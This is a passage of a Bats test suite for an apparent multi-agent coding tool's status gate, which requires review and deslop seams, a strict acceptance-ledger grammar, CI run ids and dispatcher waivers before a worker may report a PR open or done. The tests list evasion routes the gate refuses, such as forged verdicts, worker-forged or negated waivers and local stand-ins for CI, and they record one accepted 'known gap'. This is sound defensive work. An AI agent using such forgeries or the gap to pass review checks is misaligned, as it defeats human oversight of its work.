@test "pr_open: a later lead-to-reviewer message cancels the lead seam" {
  _ROW_FAILURES=()
  rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  local n=0 label body rc
  while IFS='|' read -r label body <&3; do
    [ -n "$label" ] || continue
    case "$label" in '#'*) continue ;; esac
    n=$((n + 1))
    _reset_row_fixture "$n"
    set +e
    (
      set -e
      _task_doc standard implement pi
      _lead_seam
      run_crew msg "worker:feat/x#s1-1" "role:feat/x:reviewer" "$body"
      _gate
      _refused "no review seam"
      _note_row_stub
    )
    rc=$?
    set -e
    if [ "$rc" -ne 0 ]; then
      _ROW_FAILURES+=("$label")
      printf 'row failed: %s\n' "$label" >&2
    fi
  done 3<<'ROWS'
pr_open: a pi assignment with an elided artifact still cancels the lead's seam|{"artifact":"…[elided]"}
pr_open: a pi lead question to the reviewer cancels the lead's own review seam|{"question":"look again please"}
ROWS
  if [ -f "$BATS_TEST_TMPDIR/row-stub-dir" ]; then
    rm -rf "$(cat "$BATS_TEST_TMPDIR/row-stub-dir")"
    rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  fi
  if [ "${#_ROW_FAILURES[@]}" -ne 0 ]; then
    printf 'failing rows (%s):\n' "${#_ROW_FAILURES[@]}" >&2
    printf '  %s\n' "${_ROW_FAILURES[@]}" >&2
    return 1
  fi
}

@test "pr_open: a scalar JSON line in the log is tolerated" {
  _task_doc standard implement pi
  _verdict accept
  printf '42\n"x"\nnull\n' >>"$(git rev-parse --git-common-dir)/crew/events.jsonl"
  _deslop_seam
  _gate
  _allowed
}

# A hard kill mid-append leaves a line with no newline; the next append then
# splices onto it, so one unparsable line carries a whole valid record. #391
# fixed the writer so it no longer splices, so this builds that crash-splice
# directly: the reader's fail-closed content heuristic must still catch a valid
# reject hidden inside an unparsable torn line.
@test "pr_open: a pi accept then a reject spliced onto a torn line is refused until a fresh verdict" {
  _task_doc standard implement pi
  _verdict accept
  spliced="$(jq -nc --argjson ts "$(jq -nc 'now*1000|floor')" \
    '{ts:$ts, crew_id:"c1", from:"role:feat/x:reviewer", to:"worker:feat/x#s1-1",
      kind:"msg",
      body:"{\"role\":\"reviewer\",\"seam\":\"review\",\"verdict\":\"reject\"}"}')"
  printf 'torn{%s\n' "$spliced" >>"$(_events)"
  [ "$(tail -1 "$(_events)" | jq -R 'fromjson? // "unparsable"')" = '"unparsable"' ]
  _gate
  _refused "no review seam"
  _verdict accept
  _deslop_seam
  _gate
  [ "$status" -eq 0 ]
}

@test "pr_open: a pi accept then a torn line cut inside a reviewer reply is refused" {
  _task_doc standard implement pi
  _verdict accept
  printf '{"ts":1,"crew_id":"c1","from":"role:feat/x:reviewer","to":"wor' >>"$(_events)"
  _gate
  _refused "no review seam"
}

@test "pr_open: a pi accept then a lead assignment spliced onto a torn line is refused" {
  _task_doc standard implement pi
  _verdict accept
  # #391: build the crash-splice directly (the writer no longer glues) so the
  # reader's content heuristic still has to catch a re-request buried in a torn
  # line — a re-request cancels the accept.
  spliced="$(jq -nc --argjson ts "$(jq -nc 'now*1000|floor')" \
    '{ts:$ts, crew_id:"c1", from:"worker:feat/x#s1-1", to:"role:feat/x:reviewer",
      kind:"msg", body:"{\"seam\":\"review\",\"artifact\":\"/a/review.diff\",\"question\":\"Review this diff.\"}"}')"
  printf 'torn{%s\n' "$spliced" >>"$(_events)"
  [ "$(tail -1 "$(_events)" | jq -R 'fromjson? // "unparsable"')" = '"unparsable"' ]
  _gate
  _refused "no review seam"
}

@test "pr_open: a torn-line reject is detected for a branch whose reviewer id is JSON-escaped" {
  _task_doc standard implement pi
  run_crew msg 'role:feat/a"b:reviewer' 'worker:feat/a"b#s1-1' '{"seam":"review","verdict":"accept"}'
  # #391: build the crash-splice directly (the writer no longer glues) so the
  # reader's content heuristic still has to unescape the reviewer id.
  spliced="$(jq -nc --argjson ts "$(jq -nc 'now*1000|floor')" \
    '{ts:$ts, crew_id:"c1", from:"role:feat/a\"b:reviewer", to:"worker:feat/a\"b#s1-1",
      kind:"msg", body:"{\"seam\":\"review\",\"verdict\":\"reject\"}"}')"
  printf 'torn{%s\n' "$spliced" >>"$(_events)"
  run --separate-stderr run_crew status 'worker:feat/a"b#s1-1' pr_open "" https://example.com/pr/1
  _refused "no review seam"
}

@test "pr_open: a pi accept survives an unrelated record spliced onto a torn line" {
  _task_doc standard implement pi
  _verdict accept
  printf 'torn{' >>"$(_events)"
  run_crew msg "worker:feat/x#s1-1" "dispatcher:c1" '{"note":"x"}'
  printf 'torn{{"ts":1,"crew_id":"other","from":"role:feat/x:reviewer","to":"worker:feat/x","kind":"msg","body":"{}"}\n' >>"$(_events)"
  _deslop_seam
  _gate
  [ "$status" -eq 0 ]
}


@test "pr_open: off pi a pane reject or accept alone is refused" {
  _task_doc standard implement claude
  _verdict reject
  _gate
  _refused "no review seam"
  _verdict accept
  _gate
  _refused "no review seam"
}

@test "pr_open: off pi the lead's own review seam is allowed even after a pane reject" {
  _task_doc standard implement claude
  _verdict reject
  _lead_seam
  _deslop_seam
  _gate
  _allowed
}

@test "pr_open: a review seam with review_mode false or null is refused" {
  _task_doc standard
  _lead_seam '{"seam":"review","review_mode":false}'
  _gate
  _refused "no review seam"
  _lead_seam '{"seam":"review","review_mode":null}'
  _gate
  _refused "no review seam"
}

@test "done: a pi reviewer verdict and the lead's own review seam both count" {
  _task_doc standard implement pi
  run_crew msg "role:feat/x:reviewer" "worker:feat/x#s1-1" '{"seam":"review","verdict":"accept"}'
  _deslop_seam
  run --separate-stderr run_crew status "worker:feat/x#s1-1" done "" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ "$(_status_rows)" -eq 1 ]
  rm -f "$(git rev-parse --git-common-dir)/crew/events.jsonl"
  run_crew msg "worker:feat/x#s1-1" "review:c1" '{"seam":"review","review_mode":"full"}'
  _deslop_seam
  run --separate-stderr run_crew status "worker:feat/x#s1-1" done "" https://example.com/pr/1
  [ "$status" -eq 0 ]
}

@test "pr_open: a reviewer verdict from an earlier session still counts" {
  _task_doc deep implement pi
  run_crew msg "role:feat/x:reviewer" "worker:feat/x#s1-1" '{"seam":"review","verdict":"accept"}'
  _deslop_seam
  run --separate-stderr run_crew status "worker:feat/x#s2-2" pr_open "" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
}

@test "pr_open: a reviewer verdict does not stand in for the native batch off pi" {
  _task_doc standard implement claude
  run_crew msg "role:feat/x:reviewer" "worker:feat/x#s1-1" '{"seam":"review","verdict":"accept"}'
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "" https://example.com/pr/1
  _refused "no review seam"
}

@test "pr_open: a reviewer msg without a verdict is not a review seam" {
  _task_doc standard implement pi
  run_crew msg "role:feat/x:reviewer" "worker:feat/x#s1-1" '{"role":"reviewer","event":"role_exited","pane":"%3"}'
  run_crew msg "role:feat/x:reviewer" "worker:feat/x#s1-1" '{"seam":"review","verdict":"maybe"}'
  run_crew msg "role:feat/x:reviewer" "worker:feat/x#s1-1" '{"seam":"plan","verdict":"accept"}'
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "" https://example.com/pr/1
  _refused "no review seam"
}

@test "pr_open: a verdict forged under the worker id or another branch's reviewer does not count" {
  _task_doc standard implement pi
  run_crew msg "worker:feat/x#s1-1" "role:feat/x:reviewer" '{"seam":"review","verdict":"accept"}'
  run_crew msg "role:feat/other:reviewer" "worker:feat/x#s1-1" '{"seam":"review","verdict":"accept"}'
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "" https://example.com/pr/1
  _refused "no review seam"
}

# F18: folded family — a review seam addressed away from review: does not
# count (a tagged retro note, metrics, or another branch).
@test "pr_open: a review seam addressed away from review: does not count" {
  _ROW_FAILURES=()
  rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  local n=0 label from to body rc
  while IFS='|' read -r label from to body <&3; do
    [ -n "$label" ] || continue
    case "$label" in '#'*) continue ;; esac
    n=$((n + 1))
    _reset_row_fixture "$n"
    set +e
    (
      set -e
      _task_doc standard
      run_crew msg "$from" "$to" "$body"
      run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "" https://example.com/pr/1
      _refused "no review seam"
      _note_row_stub
    )
    rc=$?
    set -e
    if [ "$rc" -ne 0 ]; then
      _ROW_FAILURES+=("$label")
      printf 'row failed: %s\n' "$label" >&2
    fi
  done 3<<'ROWS'
pr_open: a tagged retro note is not a review seam|worker:feat/x#s1-1|retro:c1|{"seam":"review","tag":"other","detail":"x"}
pr_open: a review seam sent to metrics does not count|worker:feat/x#s1-1|metrics:c1|{"seam":"review","review_mode":"full"}
pr_open: a review seam from another branch does not count|worker:feat/other#s1-1|review:c1|{"seam":"review"}
ROWS
  if [ -f "$BATS_TEST_TMPDIR/row-stub-dir" ]; then
    rm -rf "$(cat "$BATS_TEST_TMPDIR/row-stub-dir")"
    rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  fi
  if [ "${#_ROW_FAILURES[@]}" -ne 0 ]; then
    printf 'failing rows (%s):\n' "${#_ROW_FAILURES[@]}" >&2
    printf '  %s\n' "${_ROW_FAILURES[@]}" >&2
    return 1
  fi
}

@test "pr_open: a review seam with review_mode none or unavailable does not count" {
  _task_doc standard
  run_crew msg "worker:feat/x#s1-1" "review:c1" '{"seam":"review","review_mode":"none"}'
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "" https://example.com/pr/1
  _refused "no review seam"
  run_crew msg "worker:feat/x#s1-1" "review:c1" '{"seam":"review","review_mode":"unavailable"}'
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "" https://example.com/pr/1
  _refused "no review seam"
}

@test "pr_open: a reviewer verdict posted under a different crew does not count" {
  # Written before WORKER_TASK.md exists so CREW_ID=c2 wins; only the crew_id
  # filter excludes it.
  CREW_ID=c2 run_crew msg "role:feat/x:reviewer" "worker:feat/x#s1-1" '{"seam":"review","verdict":"accept"}'
  seam_crew=$(jq -r 'select(.kind=="msg" and .from=="role:feat/x:reviewer") | .crew_id' "$(git rev-parse --git-common-dir)/crew/events.jsonl")
  [ "$seam_crew" = c2 ]
  _task_doc standard implement pi
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "" https://example.com/pr/1
  _refused "no review seam"
}

@test "pr_open/done: trivial with no review seam posts silently" {
  _task_doc trivial
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
  run --separate-stderr run_crew status "worker:feat/x#s1-1" done "" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
  [ "$(_status_rows)" -eq 2 ]
}

@test "done: a kind review session needs no review seam" {
  _task_doc standard review
  run --separate-stderr run_crew status "worker:feat/x#s1-1" done "reviewed PR 9 — https://x"
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
  [ "$(_status_rows)" -eq 1 ]
}

@test "done/failed: a role caller and a failed worker are not gated" {
  _task_doc standard
  run --separate-stderr run_crew status "role:feat/x:reviewer" done ""
  [ "$status" -eq 0 ]
  run --separate-stderr run_crew status "worker:feat/x#s1-1" failed "tests red"
  [ "$status" -eq 0 ]
  [ "$(_status_rows)" -eq 2 ]
}

@test "pr_open: the acceptance ledger rides in the status detail" {
  _task_doc trivial
  _waive
  run_crew status "worker:feat/x#s1-1" pr_open "AC1 pass(bats) AC2 waived(dispatcher)" https://example.com/pr/1
  [ "$(jq -r 'select(.kind=="status") | .body.detail' "$(git rev-parse --git-common-dir)/crew/events.jsonl")" = "AC1 pass(bats) AC2 waived(dispatcher)" ]
}

@test "pr_open: no WORKER_TASK.md applies no gate" {
  CREW_ID=c1 run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "AC1 pending(sim)" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ "$(_status_rows)" -eq 1 ]
}

# Folded family — standard or deep with a review seam but no deslop seam.
# The done: sibling stays its own test; the status verb differs.
@test "pr_open: standard or deep with a review seam but no deslop seam is refused" {
  _ROW_FAILURES=()
  rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  local n=0 label tier rc
  while IFS='|' read -r label tier <&3; do
    [ -n "$label" ] || continue
    case "$label" in '#'*) continue ;; esac
    n=$((n + 1))
    _reset_row_fixture "$n"
    set +e
    (
      set -e
      _task_doc "$tier"
      _lead_seam
      _gate
      _refused "no deslop seam"
      _note_row_stub
    )
    rc=$?
    set -e
    if [ "$rc" -ne 0 ]; then
      _ROW_FAILURES+=("$label")
      printf 'row failed: %s\n' "$label" >&2
    fi
  done 3<<'ROWS'
pr_open: standard with a review seam but no deslop seam is refused|standard
pr_open: deep with a review seam but no deslop seam is refused|deep
ROWS
  if [ -f "$BATS_TEST_TMPDIR/row-stub-dir" ]; then
    rm -rf "$(cat "$BATS_TEST_TMPDIR/row-stub-dir")"
    rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  fi
  if [ "${#_ROW_FAILURES[@]}" -ne 0 ]; then
    printf 'failing rows (%s):\n' "${#_ROW_FAILURES[@]}" >&2
    printf '  %s\n' "${_ROW_FAILURES[@]}" >&2
    return 1
  fi
}

@test "done: standard with a review seam but no deslop seam is refused" {
  _task_doc standard
  _lead_seam
  run --separate-stderr run_crew status "worker:feat/x#s1-1" done "" https://example.com/pr/1
  _refused "no deslop seam"
}

@test "pr_open: standard with review and deslop seams posts silently" {
  _task_doc standard
  _lead_seam
  _deslop_seam
  _gate
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
  [ "$(jq -r 'select(.kind=="status") | .body.state' "$(git rev-parse --git-common-dir)/crew/events.jsonl")" = pr_open ]
}

@test "pr_open/done: a resumed session inherits the branch's earlier review and deslop seams" {
  _task_doc deep
  _lead_seam
  _deslop_seam
  run --separate-stderr run_crew status "worker:feat/x#s2-2" pr_open "" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
  run --separate-stderr run_crew status "worker:feat/x#s2-2" done "" https://example.com/pr/1
  [ "$status" -eq 0 ]
}

# F19: folded family — a deslop seam addressed away from the deslop shape
# does not count (metrics, another branch, or a tag).
@test "pr_open: a deslop seam addressed away from the deslop shape does not count" {
  _ROW_FAILURES=()
  rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  local n=0 label from to body rc
  while IFS='|' read -r label from to body <&3; do
    [ -n "$label" ] || continue
    case "$label" in '#'*) continue ;; esac
    n=$((n + 1))
    _reset_row_fixture "$n"
    set +e
    (
      set -e
      _task_doc standard
      _lead_seam
      run_crew msg "$from" "$to" "$body"
      _gate
      _refused "no deslop seam"
      _note_row_stub
    )
    rc=$?
    set -e
    if [ "$rc" -ne 0 ]; then
      _ROW_FAILURES+=("$label")
      printf 'row failed: %s\n' "$label" >&2
    fi
  done 3<<'ROWS'
pr_open: a deslop seam sent to metrics does not count|worker:feat/x#s1-1|metrics:c1|{"seam":"deslop"}
pr_open: a deslop seam from another branch does not count|worker:feat/other#s1-1|review:c1|{"seam":"deslop"}
pr_open: a tagged deslop seam does not count|worker:feat/x#s1-1|review:c1|{"seam":"deslop","tag":"x"}
ROWS
  if [ -f "$BATS_TEST_TMPDIR/row-stub-dir" ]; then
    rm -rf "$(cat "$BATS_TEST_TMPDIR/row-stub-dir")"
    rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  fi
  if [ "${#_ROW_FAILURES[@]}" -ne 0 ]; then
    printf 'failing rows (%s):\n' "${#_ROW_FAILURES[@]}" >&2
    printf '  %s\n' "${_ROW_FAILURES[@]}" >&2
    return 1
  fi
}

@test "pr_open: a deslop seam alone without a review seam is refused for the review seam first" {
  _task_doc standard
  _deslop_seam
  _gate
  _refused "no review seam"
}

@test "pr_open: a kind review deep session needs no review or deslop seam" {
  _task_doc deep review
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
}

@test "pr_open: a pi reviewer accept with the lead's deslop seam passes" {
  _task_doc standard implement pi
  _verdict accept
  _deslop_seam
  _gate
  _allowed
}

@test "pr_open: a pi reviewer accept without a deslop seam is refused" {
  _task_doc standard implement pi
  _verdict accept
  _gate
  _refused "no deslop seam"
}

@test "pr_open: an unparsable log line does not break the deslop check" {
  _task_doc standard
  _lead_seam
  printf 'garbage\n' >>"$(git rev-parse --git-common-dir)/crew/events.jsonl"
  _deslop_seam
  _gate
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
}

# --- terminal status gate: acceptance ledger grammar (#332) ---

@test "pr_open: every truth-table ledger the grammar refuses is refused on every tier" {
  _task_doc trivial
  local -a details=(
    'AC1 pass(bats); AC2 skipped (not run: no simulator)'
    'AC2 (pending on device)'
    'AC3 deferred (not done yet)'
    '(AC2 pending)'
    'AC2 pending(sim)'
    'AC1 pass(bats); AC2 pending(sim)'
    'AC3 NOT DONE'
    'AC4 not run'
    'AC1 pending(sim); AC2 waived(dispatcher)'
    'AC1 pass(x) AC2 pending'
    'AC1 pass(x AC2 pending(sim)'
    'AC2 waived(dispatcher) not run on CI'
    'AC1 pass(x) AC2 pending AC3 pass(y)'
    'AC1 pass(x); AC2 pending; AC3 pass(y)'
    'AC2 pass()'
    'AC2 waived(self)'
    'AC2 waived(low risk)'
    'AC2 n/a(no ui)'
    'A7b partial(flag yes, viewer unit-only)'
    'acceptance ledger: all pass, see PR body/comment'
    'AC1 pass(x)) AC2 pending'
    'AC1 pass(x); AC2'
    'AC1 passed (no pending migrations)'
    'AC2 waived(dispatcher) (not run on CI)'
  )
  for d in "${details[@]}"; do
    run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "$d" https://example.com/pr/1
    _refused "every acceptance ledger item"
  done
}

@test "pr_open: every truth-table ledger the grammar accepts is written" {
  _task_doc trivial
  local -a details=(
    'AC1 pass(bats) AC2 waived(dispatcher)'
    'AC5 pass(bats: pending ledger refused)'
    'PASS(ci pending)'
    'AC1 pass(nix build (x86) not run twice)'
    'AC1 pass(bats: 3 pending sub-tests skipped (see log (details))); AC2 pass(nix build)'
    'AC2 waived(dispatcher: not run on CI)'
    ''
    '   '
    'AC1 pass(bats); AC2 pass(nix build); AC3 waived(dispatcher)'
    'AC1 pass(bats); AC2 pass(nix build); AC3 waived(dispatcher);'
    'AC1-3 pass(vitest), AC4 pass(test+emu log)'
    'AC1: pass(bats)'
    'AC2 WAIVED(Dispatcher)'
  )
  local n=0
  for d in "${details[@]}"; do
    n=$((n + 1))
    _waive "worker:feat/x#s1-$n"
    run --separate-stderr run_crew status "worker:feat/x#s1-$n" pr_open "$d" https://example.com/pr/1
    [ "$status" -eq 0 ]
    [ -z "$stderr" ]
  done
  [ "$(_status_rows)" -eq "$n" ]
}

@test "pr_open: a CI item needs a CI run id or actions/runs URL, a local stand-in is refused" {
  _task_doc trivial
  printf '\n## Acceptance\n- CI green on the PR head\n- Non-CI items behave as before\n' >>WORKER_TASK.md
  local -a refused=(
    'AC1 pass(bats-affected)'
    'AC1 pass(local stand-in: shellcheck and bats-affected)'
    'AC1 pass(pre-push hook: trim-trailing-whitespace passed)'
    'AC2 pass(CI green, 12 tests)'
    'AC1 pass(bats); AC2 pass(bats)'
  )
  local d
  for d in "${refused[@]}"; do
    run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "$d" https://example.com/pr/1
    _refused "CI run id"
  done
  local -a accepted=(
    'AC1 pass(https://github.com/o/r/actions/runs/123456789)'
    'AC1 pass(CI run 123456789); AC2 pass(bats)'
    'AC1 pass(run id 9876543)'
    'AC2 pass(bats)'
    'AC2 waived(dispatcher: not run on CI)'
  )
  local n=0
  for d in "${accepted[@]}"; do
    n=$((n + 1))
    _waive "worker:feat/x#s1-$n"
    run --separate-stderr run_crew status "worker:feat/x#s1-$n" pr_open "$d" https://example.com/pr/1
    [ "$status" -eq 0 ]
  done
}

@test "pr_open: a CI item is found by explicit id in the task doc" {
  _task_doc trivial
  printf '\n## Acceptance\n- AC2 Tests pass\n- **AC1** CI passes\n' >>WORKER_TASK.md
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "AC1 pass(bats)" https://example.com/pr/1
  _refused "CI run id"
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "AC2 pass(bats); AC1 pass(actions/runs/42)" https://example.com/pr/1
  [ "$status" -eq 0 ]
}

@test "pr_open: waived(dispatcher) needs a dispatcher waive msg to this session on the bus" {
  _task_doc trivial
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "AC1 waived(dispatcher)" https://example.com/pr/1
  _refused "dispatcher waiver"
  # a worker-forged msg, a non-waive reply and a reply to another session do not count
  run_crew msg "worker:feat/x#s1-1" "dispatcher:c1" "waive AC1"
  _waive "worker:feat/x#s1-1" "carry on"
  _waive "worker:feat/x#s0-9" "waive AC1"
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "AC1 waived(dispatcher)" https://example.com/pr/1
  [ "$status" -eq 1 ]
  [[ "$stderr" == *"dispatcher waiver"* ]]
  _waive "worker:feat/x#s1-1" "waive AC1"
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "AC1 waived(dispatcher: draft CI pending)" https://example.com/pr/1
  [ "$status" -eq 0 ]
}

@test "pr_open: a negated waiver does not count and each waived item needs its own id named" {
  _task_doc trivial
  local n
  for n in "will not waive AC1" "I don't waive AC1" "not waiving AC1"; do
    _waive "worker:feat/x#s1-1" "$n"
    run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "AC1 waived(dispatcher)" https://example.com/pr/1
    _refused "dispatcher waiver"
  done
  _waive "worker:feat/x#s1-1" "waive AC1 but not AC2"
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "AC1 waived(dispatcher); AC2 waived(dispatcher)" https://example.com/pr/1
  _refused "'AC2'"
  _waive "worker:feat/x#s1-1" "waive AC2 and AC3"
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "AC1 waived(dispatcher); AC2 waived(dispatcher); AC3 waived(dispatcher)" https://example.com/pr/1
  [ "$status" -eq 0 ]
}

@test "pr_open: a dotted-id waiver covers only that id and an id-less waived item is refused" {
  _task_doc trivial
  _waive "worker:feat/x#s1-1" "waive AC2.1"
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "AC2 waived(dispatcher)" https://example.com/pr/1
  _refused "dispatcher waiver"
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "waived(dispatcher)" https://example.com/pr/1
  _refused "needs its acceptance id"
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "AC2.1 waived(dispatcher)" https://example.com/pr/1
  [ "$status" -eq 0 ]
}

@test "pr_open: fenced # lines and a bold Out of scope list do not shift Acceptance entries" {
  _task_doc trivial
  printf '\n## Acceptance\n\n```\n# x\n- fenced item\n```\n- tests pass\n- CI green\n' >>WORKER_TASK.md
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "2 pass(bats)" https://example.com/pr/1
  _refused "CI run id"
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "1 pass(bats)" https://example.com/pr/1
  [ "$status" -eq 0 ]
}

@test "pr_open: a bold Out of scope list after a bold Acceptance header is not read as items" {
  _task_doc trivial
  printf '\n**Acceptance:**\n- tests pass\n\n**Out of scope:**\n- CI green\n' >>WORKER_TASK.md
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "2 pass(bats)" https://example.com/pr/1
  [ "$status" -eq 0 ]
}

@test "pr_open: id-less items, other Acceptance spellings, AC0 and look-alike run words are checked" {
  _task_doc trivial
  printf '\n**Acceptance:**\n- CI green on the PR head\n' >>WORKER_TASK.md
  local d
  for d in 'waived(dispatcher)' 'pass(CI green)' 'AC1 pass(bats)' 'AC1 pass(CI dry-run 20261006 local)'; do
    run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "$d" https://example.com/pr/1
    [ "$status" -eq 1 ]
    [[ "$stderr" == *"CI run id"* || "$stderr" == *"dispatcher waiver"* || "$stderr" == *"needs its acceptance id"* ]]
  done
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "AC0 pass(bats)" https://example.com/pr/1
  [ "$status" -eq 0 ]
}

@test "pr_open: CI entries resolve by numeric id, ledger position and top-level bullets only" {
  _task_doc trivial
  printf '\n## Acceptance\n1. Tests pass\n   - covers x\n2. CI green\n' >>WORKER_TASK.md
  local d
  for d in '2 pass(bats)' 'AC02 pass(bats)' 'pass(bats); pass(bats)' $'AC2 pass(local\nCI green)'; do
    run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "$d" https://example.com/pr/1
    [ "$status" -eq 1 ]
    [[ "$stderr" == *"CI run id"* ]]
  done
  run --separate-stderr run_crew status "worker:feat/x#s1-2" pr_open "AC1 pass(bats); AC2 pass(CI run_id=1234567)" https://example.com/pr/1
  [ "$status" -eq 0 ]
}

@test "pr_open: a lone state word before a valid item reads as its id (known gap)" {
  # Known accepted gap: a single-token state word with no parens reads as the id
  # of the next item. A drifting agent is unlikely to write it.
  _task_doc trivial
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "AC1 pass(x) pending pass(y)" https://example.com/pr/1
  [ "$status" -eq 0 ]
  [ -z "$stderr" ]
  [ "$(_status_rows)" -eq 1 ]
}

@test "pr_open: an empty ledger is refused when the task doc has an ## Acceptance list" {
  _acceptance_doc trivial
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "" https://example.com/pr/1
  _refused "acceptance list"
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "   " https://example.com/pr/1
  _refused "acceptance list"
}

@test "pr_open: the refusal hint points a no-acceptance-list worker at an empty detail" {
  # No acceptance list: a free-text detail is refused, but the hint must name
  # the empty-detail post, not steer the worker to invent `AC1 pass(n/a)`.
  _task_doc trivial
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "PR opened" https://example.com/pr/1
  _refused "no acceptance list"
  [[ "$stderr" == *'pr_open ""'* ]]
  [[ "$stderr" == *'an empty detail is the correct pr_open'* ]]
}

@test "pr_open: the refusal hint keeps the ledger grammar when an acceptance list exists" {
  _acceptance_doc trivial
  run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "PR opened" https://example.com/pr/1
  _refused "every acceptance ledger item"
  [[ "$stderr" != *'no acceptance list'* ]]
}

# F20: folded family — an acceptance heading keeps the ledger hint and
# refuses an empty detail. #386: bold spellings are equivalent lists.
# #395: a heading that wraps the word in bold on the same line is a list.
# A ### heading is an acceptance list, so a free-text detail keeps the ledger
# grammar and an empty detail is refused.
@test "pr_open: an acceptance heading keeps the ledger hint and refuses an empty detail" {
  _ROW_FAILURES=()
  rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  local n=0 label heading rc
  while IFS='|' read -r label heading <&3; do
    [ -n "$label" ] || continue
    case "$label" in '#'*) continue ;; esac
    n=$((n + 1))
    _reset_row_fixture "$n"
    set +e
    (
      set -e
      _task_doc trivial
      printf '\n%s\n- AC1\n' "$heading" >>WORKER_TASK.md
      run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "PR opened" https://example.com/pr/1
      _refused "every acceptance ledger item"
      [[ "$stderr" != *'no acceptance list'* ]]
      run --separate-stderr run_crew status "worker:feat/x#s2-2" pr_open "" https://example.com/pr/1
      _refused "acceptance list"
      _note_row_stub
    )
    rc=$?
    set -e
    if [ "$rc" -ne 0 ]; then
      _ROW_FAILURES+=("$label")
      printf 'row failed: %s\n' "$label" >&2
    fi
  done 3<<'ROWS'
pr_open: a ### Acceptance criteria list keeps the ledger hint (not the empty-detail steer)|### Acceptance criteria
pr_open: a bold **Acceptance:** list keeps the ledger hint (not the empty-detail steer)|**Acceptance:**
pr_open: an inline-bold ### **Acceptance criteria** heading is detected|### **Acceptance criteria**
ROWS
  if [ -f "$BATS_TEST_TMPDIR/row-stub-dir" ]; then
    rm -rf "$(cat "$BATS_TEST_TMPDIR/row-stub-dir")"
    rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  fi
  if [ "${#_ROW_FAILURES[@]}" -ne 0 ]; then
    printf 'failing rows (%s):\n' "${#_ROW_FAILURES[@]}" >&2
    printf '  %s\n' "${_ROW_FAILURES[@]}" >&2
    return 1
  fi
}

# F21: folded family — an acceptance marker keeps the ledger hint.
# a bold **Acceptance criteria** list keeps the ledger hint
# a line-start Acceptance: is detected case-insensitively
@test "pr_open: an acceptance marker keeps the ledger hint" {
  _ROW_FAILURES=()
  rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  local n=0 label block rc
  while IFS='|' read -r label block <&3; do
    [ -n "$label" ] || continue
    case "$label" in '#'*) continue ;; esac
    n=$((n + 1))
    _reset_row_fixture "$n"
    set +e
    (
      set -e
      _task_doc trivial
      block="${block//\\n/$'\n'}"
      printf '%s' "$block" >>WORKER_TASK.md
      run --separate-stderr run_crew status "worker:feat/x#s1-1" pr_open "PR opened" https://example.com/pr/1
      _refused "every acceptance ledger item"
      [[ "$stderr" != *'no acceptance list'* ]]
      _note_row_stub
    )
    rc=$?
    set -e
    if [ "$rc" -ne 0 ]; then
      _ROW_FAILURES+=("$label")
      printf 'row failed: %s\n' "$label" >&2
    fi
  done 3<<'ROWS'
pr_open: a bold **Acceptance criteria** list keeps the ledger hint|\n**Acceptance criteria**\n- AC1\n
pr_open: a line-start Acceptance: is detected case-insensitively|\nacceptance: AC1 pass(x)\n
ROWS
  if [ -f "$BATS_TEST_TMPDIR/row-stub-dir" ]; then
    rm -rf "$(cat "$BATS_TEST_TMPDIR/row-stub-dir")"
    rm -f "$BATS_TEST_TMPDIR/row-stub-dir"
  fi
  if [ "${#_ROW_FAILURES[@]}" -ne 0 ]; then
